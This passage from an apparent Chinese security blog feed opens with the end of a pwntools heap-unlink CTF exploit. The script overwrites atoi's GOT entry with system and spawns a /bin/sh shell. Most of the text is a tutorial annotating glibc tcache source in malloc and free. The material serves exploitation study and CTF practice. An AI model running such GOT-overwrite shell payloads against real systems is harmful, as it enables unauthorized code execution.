class="number">0x8</span>)+p64(e.got[<span class="string">'atoi'</span>])</span><br><span class="line">payload2+=<span class="string">'\x00'</span>*(<span class="number">0x120</span><span class="number">-80</span>)</span><br><span class="line">edit(<span class="number">0</span>,payload2)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'Your choice: Invalid!\n'</span>)</span><br><span class="line"></span><br><span class="line">List()</span><br><span class="line">p.recvuntil(<span class="string">'2. '</span>)</span><br><span class="line">atoi_in_server=u64(p.recvuntil(<span class="string">'\x0a'</span>)[:<span class="number">-1</span>].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">system_in_server=libc.symbols[<span class="string">'system'</span>]+atoi_in_server-libc.symbols[<span class="string">'atoi'</span>]</span><br><span class="line"><span class="comment">#gdb.attach(proc.pidof(p)[0])</span></span><br><span class="line"></span><br><span class="line">payload3=p64(system_in_server)</span><br><span class="line">edit(<span class="number">0</span>,payload3)</span><br><span class="line">edit(<span class="number">1</span>,<span class="string">"/bin/sh\x00"</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>参考链接：<a href="https://blog.csdn.net/qq_40827990/java/article/details/88090810" target="_blank" rel="noopener">https://blog.csdn.net/qq_40827990/java/article/details/88090810</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h2&gt;&lt;p&gt;unlink是在smallbin被释放的时候的一种操作，是将当前物理内存相邻的free chunk进行合并,简单的讲就是我们在free一个s
      
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>tcache机制</title>
    <link href="https://nocbtm.github.io/2020/02/27/tcache%E6%9C%BA%E5%88%B6/"/>
    <id>https://nocbtm.github.io/2020/02/27/tcache机制/</id>
    <published>2020-02-27T03:36:21.000Z</published>
    <updated>2020-04-09T13:15:24.347Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><code>glibc 2.26</code> 开始引入了 <code>tcache</code> , 相关的 commit 可以看<br><a href="https://sourceware.org/git/p=glibc.git;a=commitdiff;h=d5c3fafc4307c9b7a4c7d5cb381fcdbfad340bcc" target="_blank" rel="noopener">https://sourceware.org/git/p=glibc.git;a=commitdiff;h=d5c3fafc4307c9b7a4c7d5cb381fcdbfad340bcc</a> 。<br>加入 <code>tcache</code> 对性能有比较大的提升，不过由于 <code>tcache</code> 的存在 ，一些利用方式的限制条件就少了许多。具体往下看。</p><p>相关文件位于 <a href="https://github.com/andigena/ptmalloc-fanzine/tree/master/05-tcache" target="_blank" rel="noopener">https://github.com/andigena/ptmalloc-fanzine/tree/master/05-tcache</a></p><h2 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h2><p>首先分析分析源码，看看 <code>tcache</code> 的工作原理</p><h3 id="相关数据结构"><a href="#相关数据结构" class="headerlink" title="相关数据结构"></a>相关数据结构</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125; tcache_entry;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">char</span> counts[TCACHE_MAX_BINS];</span><br><span class="line">  tcache_entry *entries[TCACHE_MAX_BINS]; <span class="comment">// TCACHE_MAX_BINS = 64</span></span><br><span class="line">&#125; tcache_perthread_struct;</span><br></pre></td></tr></table></figure><p><code>tcache</code> 也是使用 类似 bins 方式来管理<code>tcache</code>  。</p><p><code>tcache_perthread_struct</code> 是整个<code>tcache</code> </p><p>每一项由 相同大小的 chunk 通过 <code>tcache_entry</code> 使用单向链表链接（类似于fastbin的链接方式）。</p><p>counts 用于记录 entries 中每一项当前链入的 chunk 数目， 最多可以有 7 个 chunk。</p><p><code>tcache_entry</code> 用于链接 chunk 的结构体， 其中就一个 next 指针，指向下一个相同大小的 chunk.</p><h3 id="基本操作"><a href="#基本操作" class="headerlink" title="基本操作"></a>基本操作</h3><p>下面通过分析对 tcache 的两个基本操作理解上面结构体的作用</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> __always_inline <span class="keyword">void</span></span><br><span class="line">tcache_put (mchunkptr chunk, <span class="keyword">size_t</span> tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">  e-&gt;next = tcache-&gt;entries[tc_idx];</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;  <span class="comment">// 增加到链表头部</span></span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);  <span class="comment">// 记录当前 bin 的 chunk数</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> __always_inline <span class="keyword">void</span> *</span><br><span class="line">tcache_get (<span class="keyword">size_t</span> tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = tcache-&gt;entries[tc_idx];</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">  assert (tcache-&gt;entries[tc_idx] &gt; <span class="number">0</span>);</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e-&gt;next;</span><br><span class="line">  --(tcache-&gt;counts[tc_idx]);</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">void</span> *) e;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="tcache-put"><a href="#tcache-put" class="headerlink" title="tcache_put"></a>tcache_put</h3><p>用于把一个 <code>chunk</code> 放到 指定的 <code>tcache-&gt;entries</code> 里面去， <code>tc_idx</code> 通过 <code>csize2tidx (nb)</code> 计算得到 （<code>nb</code>是 <code>chunk</code> 的大小）。</p><p>它首先把 <code>chunk+2*SIZE_SZ</code> （就是除去 <code>header</code> 部分） 强制转换成 <code>tcache_entry *</code> 类型，然后插入到 <code>tcache-&gt;entries[tc_idx]</code> 的首部，最后把 <code>tcache-&gt;counts[tc_idx]</code> 加 <code>1</code> ，表示新增了一个 <code>chunk</code> 到 该 表项。</p><h3 id="tcache-get"><a href="#tcache-get" class="headerlink" title="tcache_get"></a>tcache_get</h3><p>根据 <code>tc_idx</code> 取出 <code>tcache-&gt;entries[tc_idx]</code> 的第一个<code>chunk</code> ， 然后把 指针强制转换为 <code>(void *)</code></p><p>这样就可以大概得到一个图</p><ul><li><code>tcache-&gt;entries</code> 的每一项通过 单向链表链接 <code>chunk</code> 。</li><li><code>tcache_entry</code> 和 <code>malloc chunk</code> 是重叠的， <code>tcache_entry-&gt;next</code> 和 <code>chunk-&gt;fd</code> 是一个位置。</li></ul><h2 id="tcache-in-malloc"><a href="#tcache-in-malloc" class="headerlink" title="tcache in malloc"></a>tcache in malloc</h2><h3 id="libc-malloc"><a href="#libc-malloc" class="headerlink" title="__libc_malloc"></a>__libc_malloc</h3><p><code>malloc</code> 的入口点是 <code>__libc_malloc</code> （做了一些注释）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">__libc_malloc (<span class="keyword">size_t</span> bytes)</span><br><span class="line">&#123;</span><br><span class="line">.............</span><br><span class="line">.............</span><br><span class="line">.............</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">  <span class="comment">/* int_free also calls request2size, be careful to not pad twice.  */</span></span><br><span class="line">  <span class="keyword">size_t</span> tbytes;</span><br><span class="line">  checked_request2size (bytes, tbytes);  <span class="comment">// tbytes 为 bytes请求的 转换后得到的 chunk 的 size</span></span><br><span class="line">  <span class="keyword">size_t</span> tc_idx = csize2tidx (tbytes);  <span class="comment">// 根据大小 tbytes ， 找到 tcache-&gt;entries 索引</span></span><br><span class="line">  MAYBE_INIT_TCACHE ();</span><br><span class="line">  DIAG_PUSH_NEEDS_COMMENT;</span><br><span class="line">  <span class="keyword">if</span> (tc_idx &lt; mp_.tcache_bins</span><br><span class="line">      <span class="comment">/*&amp;&amp; tc_idx &lt; TCACHE_MAX_BINS*/</span> <span class="comment">/* to appease gcc */</span></span><br><span class="line">      &amp;&amp; tcache</span><br><span class="line">      &amp;&amp; tcache-&gt;entries[tc_idx] != <span class="literal">NULL</span>) <span class="comment">// 如果 tcache-&gt;entries[tc_idx] 有 chunk ，就返回</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">return</span> tcache_get (tc_idx); <span class="comment">// 调用 tcache_get 拿到 chunk 然后返回</span></span><br><span class="line">    &#125;</span><br><span class="line">  DIAG_POP_NEEDS_COMMENT;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  <span class="keyword">if</span> (SINGLE_THREAD_P)</span><br><span class="line">    &#123;</span><br><span class="line">      victim = _int_malloc (&amp;main_arena, bytes);</span><br><span class="line">      assert (!victim || chunk_is_mmapped (mem2chunk (victim)) ||</span><br><span class="line">      &amp;main_arena == arena_for_chunk (mem2chunk (victim)));</span><br><span class="line">      <span class="keyword">return</span> victim;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  arena_get (ar_ptr, bytes);</span><br><span class="line">  victim = _int_malloc (ar_ptr, bytes);</span><br></pre></td></tr></table></figure><p>首先判断 <code>tcache-&gt;entries[tc_idx]</code> 里面有没有 <code>chunk</code> ，如果有就直接返回，否则进入 <code>_int_malloc</code> 分配内存。</p><p>下面看看 <code>_int_malloc</code> （主要看 <code>tcache</code> 处理的部分）</p><h3 id="int-malloc"><a href="#int-malloc" class="headerlink" title="_int_malloc"></a>_int_malloc</h3><h4 id="处理fastbin"><a href="#处理fastbin" class="headerlink" title="处理fastbin"></a>处理fastbin</h4><p>首先是把 请求的 <code>size</code> 转换成 实际 <code>malloc</code> 内部的 <code>size</code> ，然后定义了一个宏</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 从 fastbin里面移除 pp</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> REMOVE_FB(fb, victim, pp)\</span></span><br><span class="line">  <span class="keyword">do</span>\</span><br><span class="line">    &#123;\</span><br><span class="line">      victim = pp;\</span><br><span class="line">      <span class="keyword">if</span> (victim == <span class="literal">NULL</span>)\</span><br><span class="line"><span class="keyword">break</span>;\</span><br><span class="line">    &#125;\</span><br><span class="line">  <span class="keyword">while</span> ((pp = catomic_compare_and_exchange_val_acq (fb, victim-&gt;fd, victim)) \</span><br><span class="line"> != victim);</span><br></pre></td></tr></table></figure><p>用于多线程的中从 <code>fastbin</code> 里面移除一个 <code>chunk</code>.</p><p>然后进入分配的流程， 首先如果 <code>size</code> 在 <code>fastbin</code> 的范围内进入， <code>fastbin</code> 分配的流程</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb) &lt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (get_max_fast ()))</span><br><span class="line">    &#123;</span><br><span class="line">      idx = fastbin_index (nb);</span><br><span class="line">      mfastbinptr *fb = &amp;fastbin (av, idx);</span><br><span class="line">      mchunkptr pp;</span><br><span class="line">      victim = *fb;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (victim != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (SINGLE_THREAD_P)</span><br><span class="line">    *fb = victim-&gt;fd;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    REMOVE_FB (fb, pp, victim);</span><br><span class="line">  <span class="keyword">if</span> (__glibc_likely (victim != <span class="literal">NULL</span>))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">size_t</span> victim_idx = fastbin_index (chunksize (victim));</span><br><span class="line">      <span class="keyword">if</span> (__builtin_expect (victim_idx != idx, <span class="number">0</span>))</span><br><span class="line">malloc_printerr (<span class="string">"malloc(): memory corruption (fast)"</span>);</span><br><span class="line">      check_remalloced_chunk (av, victim, nb);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">size_t</span> tc_idx = csize2tidx (nb);</span><br><span class="line">      <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)   <span class="comment">// 把该 fastbin 里面其他的 bin 放到 tcache 里面</span></span><br><span class="line">&#123;</span><br><span class="line">  mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* While bin not empty and tcache not full, copy chunks.  */</span></span><br><span class="line">  <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count  <span class="comment">// 判断 tcache 中指定 bin 中 chunk 是否超过 7</span></span><br><span class="line"> &amp;&amp; (tc_victim = *fb) != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (SINGLE_THREAD_P)</span><br><span class="line">*fb = tc_victim-&gt;fd;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  REMOVE_FB (fb, pp, tc_victim);</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (tc_victim == <span class="literal">NULL</span>))</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">      tcache_put (tc_victim, tc_idx);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">      <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">      alloc_perturb (p, bytes);</span><br><span class="line">      <span class="keyword">return</span> p;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><ul><li>在 相应 <code>fastbin</code> 找到 合适的 <code>chunk</code> 后，就把 该 <code>chunk</code> 从 <code>fastbin</code> 里面拿下来</li><li>然后 把相应 <code>fastbin</code> 里面剩下的 <code>chunk</code> 全都放到 <code>tcache</code> 里面 ， 直到 <code>tcache-&gt;entries[tc_idx]</code> 满了 (已经有 <code>7</code> 个 <code>chunk</code> 了，即 <code>tcache-&gt;counts[tc_idx] = mp_.tcache_count = 7</code> ）。</li><li>最后在返回一开始拿到的 <code>chunk</code> 给用户</li></ul><p>如果 <code>fastbin</code> 不能分配，则进入 <code>smallbin</code> 的分配流程</p><h4 id="处理-smallbin"><a href="#处理-smallbin" class="headerlink" title="处理 smallbin"></a>处理 smallbin</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">    &#123;</span><br><span class="line">      idx = smallbin_index (nb);</span><br><span class="line">      bin = bin_at (av, idx);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> ((victim = last (bin)) != bin)</span><br><span class="line">        &#123;</span><br><span class="line">          bck = victim-&gt;bk;</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))</span><br><span class="line">    malloc_printerr (<span class="string">"malloc(): smallbin double linked list corrupted"</span>);</span><br><span class="line">          set_inuse_bit_at_offset (victim, nb);</span><br><span class="line">          bin-&gt;bk = bck; </span><br><span class="line">          bck-&gt;fd = bin;  <span class="comment">// 找到 chunk ， 从 smallbin拿下来准备返回给用户</span></span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">    set_non_main_arena (victim);</span><br><span class="line">          check_malloced_chunk (av, victim, nb);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">  <span class="comment">/* While we're here, if we see other chunks of the same size, // 把指定 smallbin 里面的 bin扔到 tcache里面</span></span><br><span class="line"><span class="comment">     stash them in the tcache.  */</span></span><br><span class="line">  <span class="keyword">size_t</span> tc_idx = csize2tidx (nb);</span><br><span class="line">  <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">    &#123;</span><br><span class="line">      mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* While bin not empty and tcache not full, copy chunks over.  */</span></span><br><span class="line">      <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count</span><br><span class="line">     &amp;&amp; (tc_victim = last (bin)) != bin)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (tc_victim != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      bck = tc_victim-&gt;bk;</span><br><span class="line">      set_inuse_bit_at_offset (tc_victim, nb);</span><br><span class="line">      <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">set_non_main_arena (tc_victim);</span><br><span class="line">      bin-&gt;bk = bck;</span><br><span class="line">      bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">      tcache_put (tc_victim, tc_idx);</span><br><span class="line">            &#125;</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">          <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">          alloc_perturb (p, bytes);</span><br><span class="line">          <span class="keyword">return</span> p;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>和 <code>fastbin</code> 是类似的操作， 在 <code>size</code> 对应的 <code>smallbin</code> 里面找到 <code>chunk</code> 后</p><p>把这个 <code>chunk</code> 从链表上取下来</p><p>然后把该 <code>smallbin</code> 里面剩下的 <code>bin</code> 放入到 <code>tcache</code> ， 直到 <code>tcache-&gt;entries[tc_idx]</code> 满.</p><p>如果 <code>smallbin</code> 也没能分配，进入 <code>unsorted bin</code></p><h4 id="遍历unsorted-bin"><a href="#遍历unsorted-bin" class="headerlink" title="遍历unsorted bin"></a>遍历unsorted bin</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">int</span> iters = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">while</span> ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))</span><br><span class="line">        &#123;</span><br><span class="line">          ....................</span><br><span class="line">          ....................</span><br><span class="line">          ....................</span><br><span class="line">          <span class="comment">/* remove from unsorted list */</span></span><br><span class="line">          unsorted_chunks (av)-&gt;bk = bck;</span><br><span class="line">          bck-&gt;fd = unsorted_chunks (av);</span><br><span class="line">          <span class="comment">// 把 bin 从 unsorted bin 里面拿下来后，先放入 tcache </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">     <span class="comment">// 如果unsorted bin 的大小正好，扔到 tcache ，然后继续遍历</span></span><br><span class="line"> We may <span class="keyword">return</span> one of these chunks later.  */</span><br><span class="line">      <span class="keyword">if</span> (tcache_nb</span><br><span class="line">  &amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_put (victim, tc_idx);</span><br><span class="line">  return_cached = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">#endif</span><br><span class="line">              check_malloced_chunk (av, victim, nb);</span><br><span class="line">              <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">              alloc_perturb (p, bytes);</span><br><span class="line">              <span class="keyword">return</span> p;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">         <span class="comment">//大小不刚好等于需要的size 的话，就把 bin放到 相应的 bin 里面。</span></span><br><span class="line">         .......................................</span><br><span class="line">         .......................................</span><br><span class="line">         .......................................</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">      <span class="comment">//如果有 大小适配的 unsorted bin 进入了 tcache(return_cached=1) 同时 mp_.tcache_unsorted_limit &gt; 0 默认为 0 ，不会进入分支, 继续遍历 </span></span><br><span class="line">      ++tcache_unsorted_count;</span><br><span class="line">      <span class="keyword">if</span> (return_cached</span><br><span class="line">  &amp;&amp; mp_.tcache_unsorted_limit &gt; <span class="number">0</span></span><br><span class="line">  &amp;&amp; tcache_unsorted_count &gt; mp_.tcache_unsorted_limit)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> tcache_get (tc_idx);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">         .......................................</span><br><span class="line">         .......................................</span><br><span class="line">         .......................................</span><br><span class="line">         &#125; <span class="comment">// end of  while ((victim = unsorted_chunks (av)-&gt;b</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//遍历完 unsorted bin 后 ，根据 return_cached 判断 tcache 里面是否有合适的 chunk</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">      <span class="comment">/* If all the small chunks we found ended up cached, return one now.  */</span></span><br><span class="line">      <span class="keyword">if</span> (return_cached)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> tcache_get (tc_idx);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure><ul><li>在遍历 <code>unsorted bin</code> 的时候， 如果找到大小刚好满足的 <code>bin</code> ， 不会立刻返回，而是把这个 <code>bin</code> 放入 <code>tcache</code> 里面，并且设置 <code>return_cached=1</code> ，表示 有 大小适配的 <code>unsorted bin</code> 进入了 <code>tcache</code></li><li>如果大小不是正好满足需要，就走一般的流程，把 <code>bin</code> 放到相应的 <code>smallbin</code> 或者 <code>largebin</code> 里面</li><li>遍历 <code>unsorted bin</code> 的最后，会根据 <code>return_cached</code> 判断是否有 大小适配的 <code>unsorted bin</code> 进入了 <code>tcache</code> ， <code>mp_.tcache_unsorted_limit</code> 默认为 <code>0</code> ，所以不会进入分支， 这样就会把所有的 <code>unsorted bin</code> 都放入到 <code>tcache</code>。</li><li>遍历完 <code>unsorted bin</code> 后 ，根据 <code>return_cached</code> 判断 <code>tcache</code> 里面是否有合适的 <code>chunk</code> ，有的话就可以返回了</li><li>否则 <code>large bin</code> ，<code>top chunk</code> 来分配</li></ul><h2 id="tcache-in-free"><a href="#tcache-in-free" class="headerlink" title="tcache in free"></a>tcache in free</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">_int_free (mstate av, mchunkptr p, <span class="keyword">int</span> have_lock)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">  size = chunksize (p);</span><br><span class="line">  check_inuse_chunk(av, p);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">size_t</span> tc_idx = csize2tidx (size);  <span class="comment">// tcache bin 的索引</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (tcache</span><br><span class="line">&amp;&amp; tc_idx &lt; mp_.tcache_bins  <span class="comment">// 64 ，最多 64 个 bin</span></span><br><span class="line">&amp;&amp; tcache-&gt;counts[tc_idx] &lt; 